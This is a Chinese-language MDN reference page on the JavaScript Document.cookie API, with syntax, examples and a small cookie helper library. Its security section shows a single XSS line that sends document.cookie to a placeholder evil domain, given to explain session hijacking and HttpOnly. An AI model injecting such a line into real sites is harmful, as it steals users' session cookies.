---
title: Document.cookie
slug: Web/API/Document/cookie
---

{{APIRef("DOM")}}

获取并设置与当前文档相关联的 [cookie](/zh-CN/docs/Web/HTTP/Cookies)。可以把它当成一个 `getter and setter`。

## 语法

##### 读取所有可从此位置访问的 Cookie

```
allCookies = document.cookie;
```

在上面的代码中，allCookies 被赋值为一个字符串，该字符串包含所有的 Cookie，每条 cookie 以"分号和空格 (; )"分隔 (即， `key=value` 键值对)。

##### 写一个新 cookie

```
document.cookie = newCookie;
```

`newCookie` 是一个键值对形式的字符串。需要注意的是，用这个方法一次只能对一个 cookie 进行设置或更新。

- 以下可选的 cookie 属性值可以跟在键值对后，用来具体化对 cookie 的设定/更新，使用分号以作分隔：

  - `;path=path` (例如 '/', '/mydir') 如果没有定义，默认为当前文档位置的路径。
  - `;domain=domain` (例如 'example.com'， 'subdomain.example.com') 如果没有定义，默认为当前文档位置的路径的域名部分。与早期规范相反的是，在域名前面加 . 符将会被忽视，因为浏览器也许会拒绝设置这样的 cookie。如果指定了一个域，那么子域也包含在内。
  - `;max-age=max-age-in-seconds` (例如一年为 60\*60\*24\*365)
  - `;expires=date-in-GMTString-format` 如果没有定义，cookie 会在对话结束时过期

    - 这个值的格式参见[Date.toUTCString()](/zh-CN/docs/JavaScript/Reference/Global_Objects/Date/toUTCString)

  - `;secure` (cookie 只通过 https 协议传输)

- cookie 的值字符串可以用[encodeURIComponent()](/zh-CN/docs/JavaScript/Reference/Global_Objects/encodeURIComponent)来保证它不包含任何逗号、分号或空格 (cookie 值中禁止使用这些值).

> **备注：** 在 Gecko 6.0 前，被引号括起的路径的引号会被当做路径的一部分，而不是被当做定界符。现在已被修复。

## 示例

### 示例 1: 简单用法

```js
document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";
alert(document.cookie);
// 显示：name=oeschger;favorite_food=tripe
```

### 示例 2: 得到名为 test2 的 cookie

```js
document.cookie = "test1=Hello";
document.cookie = "test2=World";

var myCookie = document.cookie.replace(
  /(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/,
  "$1",
);

alert(myCookie);
// 显示：World
```

### 示例 3: 只执行某事一次

要使下面的代码工作，请替换所有`someCookieName` (cookie 的名字) 为自定义的名字。

```js
if (document.cookie.replace(/(?:(?:^|.*;\s*)someCookieName\s*\=\s*([^;]*).*$)|^.*$/, "$1") !== "true") {
  alert("Do something here!");
  document.cookie = "someCookieName=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/";
}
}
```

## 一个小框架：一个完整支持 unicode 的 cookie 读取/写入器

作为一个格式化过的字符串，cookie 的值有时很难被自然地处理。下面的库的目的是通过定义一个和[`Storage 对象`](/zh-CN/docs/Web/Guide/API/DOM/Storage#Storage)部分`一致的`对象（docCookies），简化`document.cookie` 的获取方法。它提供完全的 Unicode 支持。

```js
/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  https://developer.mozilla.org/zh-CN/docs/DOM/document.cookie
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path], domain)
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/

var docCookies = {
  getItem: function (sKey) {
    return (
      decodeURIComponent(
        document.cookie.replace(
          new RegExp(
            "(?:(?:^|.*;)\\s*" +
              encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") +
              "\\s*\\=\\s*([^;]*).*$)|^.*$",
          ),
          "$1",
        ),
      ) || null
    );
  },
  setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) {
      return false;
    }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires =
            vEnd === Infinity
              ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT"
              : "; max-age=" + vEnd;
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie =
      encodeURIComponent(sKey) +
      "=" +
      encodeURIComponent(sValue) +
      sExpires +
      (sDomain ? "; domain=" + sDomain : "") +
      (sPath ? "; path=" + sPath : "") +
      (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function (sKey, sPath, sDomain) {
    if (!sKey || !this.hasItem(sKey)) {
      return false;
    }
    document.cookie =
      encodeURIComponent(sKey) +
      "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" +
      (sDomain ? "; domain=" + sDomain : "") +
      (sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function (sKey) {
    return new RegExp(
      "(?:^|;\\s*)" +
        encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") +
        "\\s*\\=",
    ).test(document.cookie);
  },
  keys: /* optional method: you can safely remove it! */ function () {
    var aKeys = document.cookie
      .replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "")
      .split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nIdx = 0; nIdx < aKeys.length; nIdx++) {
      aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]);
    }
    return aKeys;
  },
};
```

> **备注：** 对于永久 cookie 我们用了`Fri, 31 Dec 9999 23:59:59 GMT`作为过期日。如果你不想使用这个日期，可使用*[世界末日](http://en.wikipedia.org/wiki/Year_2038_problem)*`Tue, 19 Jan 2038 03:14:07 GMT，`它是 32 位带符号整数能表示从 1 January 1970 00:00:00 UTC 开始的最大秒长 (即`01111111111111111111111111111111`, 是 `new Date(0x7fffffff * 1e3)`).

### 写入 cookie

##### 语法

```
docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
```

##### 描述

创建或覆盖一个 cookie

##### 参数

- `name` (必要)
  - : 要创建或覆盖的 cookie 的名字 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String))。
- `value` (必要)
  - : cookie 的值 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String))。
- `end` _(可选)_
  - : [`最大年龄`](#new-cookie_max-age)的秒数 (一年为 31536e3，永不过期的 cookie 为[`Infinity`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Infinity)) ，或者过期时间的 `GMTString` 格式或[`Date 对象`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Date); 如果没有定义则会在会话结束时过期 ([`number`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Number) – 有限的或 [`Infinity`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Infinity) – [`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String), [`Date` object](/zh-CN/docs/JavaScript/Reference/Global_Objects/Date) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。
- `path` _(可选)_
  - : 例如 '/', '/mydir'。如果没有定义，默认为当前文档位置的路径。([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。路径必须为绝对路径（参见 [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt)）。关于如何在这个参数使用相对路径的方法请参见[这段](#Using_relative_URLs_in_the_path_parameter)。
- `domain` _(可选)_
  - : 例如 'example.com'，'.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (`string` 或 [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。
- `secure` _(可选)_
  - : cookie 只会被 https 传输 ([`boolean`](/zh-CN/docs/JavaScript/Reference/Global_Objects/Boolean)或[`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。

### 得到 cookie

##### 语法

```
docCookies.getItem(name)
```

##### 描述

读取一个 cookie。如果 cookie 不存在返回[`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null)。

##### 参数

- `name`
  - : 读取的 cookie 名 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).

### 移除 cookie

##### Syntax

```
docCookies.removeItem(name[, path],domain)
```

##### 描述

删除一个 cookie。

##### 参数

- `name`
  - : 要移除的 cookie 名 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).
- `path` *(*可选*)*
  - : 例如 '/', '/mydir'。如果没有定义，默认为当前文档位置的路径。([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String) or [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。路径必须为绝对路径（参见 [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt)）。关于如何在这个参数使用相对路径的方法请参见[这段](#Using_relative_URLs_in_the_path_parameter)。
- `domain` (可选)
  - : 例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (`string` 或 [`null`](/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null))。

### 检测 cookie

##### 语法

```
docCookies.hasItem(name)
```

##### 描述

检查一个 cookie 是否存在

##### 参数

- `name`
  - : 要检查的 cookie 名 ([`string`](/zh-CN/docs/JavaScript/Reference/Global_Objects/String)).

### 得到所有 cookie 的列表

##### 语法

```
docCookies.keys()
```

##### 描述

返回一个这个路径所有可读的 cookie 的数组。

### 示例用法：

```js
docCookies.setItem("test0", "Hello world!");
docCookies.setItem(
  "test1",
  "Unicode test: \u00E0\u00E8\u00EC\u00F2\u00F9",
  Infinity,
);
docCookies.setItem("test2", "Hello world!", new Date(2020, 5, 12));
docCookies.setItem("test3", "Hello world!", new Date(2027, 2, 3), "/blog");
docCookies.setItem("test4", "Hello world!", "Sun, 06 Nov 2022 21:43:15 GMT");
docCookies.setItem(
  "test5",
  "Hello world!",
  "Tue, 06 Dec 2022 13:11:07 GMT",
  "/home",
);
docCookies.setItem("test6", "Hello world!", 150);
docCookies.setItem("test7", "Hello world!", 245, "/content");
docCookies.setItem("test8", "Hello world!", null, null, "example.com");
docCookies.setItem("test9", "Hello world!", null, null, null, true);
docCookies.setItem("test1;=", "Safe character test;=", Infinity);

alert(docCookies.keys().join("\n"));
alert(docCookies.getItem("test1"));
alert(docCookies.getItem("test5"));
docCookies.removeItem("test1");
docCookies.removeItem("test5", "/home");
alert(docCookies.getItem("test1"));
alert(docCookies.getItem("test5"));
alert(docCookies.getItem("unexistingCookie"));
alert(docCookies.getItem());
alert(docCookies.getItem("test1;="));
```

## 安全

路径限制并**不能**阻止从其他路径访问 cookie. 使用简单的 DOM 即可轻易地绕过限制 (比如创建一个指向限制路径的，隐藏的[iframe](/zh-CN/docs/Web/HTML/Element/iframe), 然后访问其 `contentDocument.cookie` 属性). 保护 cookie 不被非法访问的唯一方法是将它放在另一个域名/子域名之下，利用[同源策略](/zh-CN/docs/Web/Security/Same-origin_policy)保护其不被读取。

Web 应用程序通常使用 cookies 来标识用户身份及他们的登录会话。因此通过窃听这些 cookie，就可以劫持已登录用户的会话。窃听的 cookie 的常见方法包括社会工程和 XSS 攻击 -

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly` 属性可以阻止通过 javascript 访问 cookie，从而一定程度上遏制这类攻击。参见 [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).

## 备注

- 从 Firefox 2 起，有更好的客户端存储机制用以替代 cookie - [WHATWG DOM Storage](/zh-CN/docs/DOM/Storage).
- 你可以通过更新一个 cookie 的过期时间为 0 来删除一个 cookie。
- 请注意，更多/更大的 cookies 意味着每个请求都要包含更繁重的数据传输。如果您只是需要存储些 "client-only" 的数据，那么郑重建议您使用 [WHATWG DOM Storage](/zh-CN/docs/DOM/Storage).

## 规范

[DOM Level 2: HTMLDocument.cookie](http://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-8747038)

## 参见

- [HTTP cookies](/zh-CN/docs/Web_Development/HTTP_cookies)
- [Cookies](/zh-CN/docs/Code_snippets/Cookies) (Code snippets)
